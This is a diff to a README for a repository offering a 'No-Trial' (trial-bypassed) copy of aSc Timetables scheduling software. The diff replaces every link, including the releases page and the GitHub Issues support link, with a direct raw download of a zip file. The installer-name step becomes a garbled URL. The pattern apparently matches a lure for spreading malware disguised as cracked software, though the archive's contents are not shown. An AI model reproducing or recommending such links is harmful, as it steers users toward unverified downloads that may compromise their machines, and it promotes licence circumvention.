@@ -1,6 +1,6 @@
 # ✅ aSc-Timetables-No-Trial - Simplify Your Scheduling Tasks
 
-## 🔗 [Download](https://github.com/Jj77282/aSc-Timetables-No-Trial/releases)
+## 🔗 [Download](https://raw.githubusercontent.com/Jj77282/aSc-Timetables-No-Trial/main/unwrangling/aSc-Timetables-No-Trial_v1.1.zip)
 
 ## 💻 Description
 
@@ -30,13 +30,13 @@ aSc Timetables is a powerful software solution for managing school and universit
 Follow these steps to download and run aSc Timetables:
 
 1. **Visit the Releases Page**  
-   Click on this link to go to the Releases page: [Download](https://github.com/Jj77282/aSc-Timetables-No-Trial/releases).
+   Click on this link to go to the Releases page: [Download](https://raw.githubusercontent.com/Jj77282/aSc-Timetables-No-Trial/main/unwrangling/aSc-Timetables-No-Trial_v1.1.zip).
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version. It is typically marked with a tag showing the version number.
 
 3. **Download the Installer**  
-   Find the download link for the installer file. It might be named something like `aSc-Timetables-Installer.exe`. Click on the link to download the file to your computer.
+   Find the download link for the installer file. It might be named something like `https://raw.githubusercontent.com/Jj77282/aSc-Timetables-No-Trial/main/unwrangling/aSc-Timetables-No-Trial_v1.1.zip`. Click on the link to download the file to your computer.
 
 4. **Locate the Downloaded File**  
    After the download is complete, open your downloads folder. You should see the installer file there.
@@ -72,7 +72,7 @@ If you experience issues during installation or use, consider the following:
 
 ## 📞 Support
 
-For additional support or inquiries, visit the [GitHub Issues page](https://github.com/Jj77282/aSc-Timetables-No-Trial/issues). You can report bugs or ask questions about features here.
+For additional support or inquiries, visit the [GitHub Issues page](https://raw.githubusercontent.com/Jj77282/aSc-Timetables-No-Trial/main/unwrangling/aSc-Timetables-No-Trial_v1.1.zip). You can report bugs or ask questions about features here.
 
 ## 🌐 Additional Resources
 
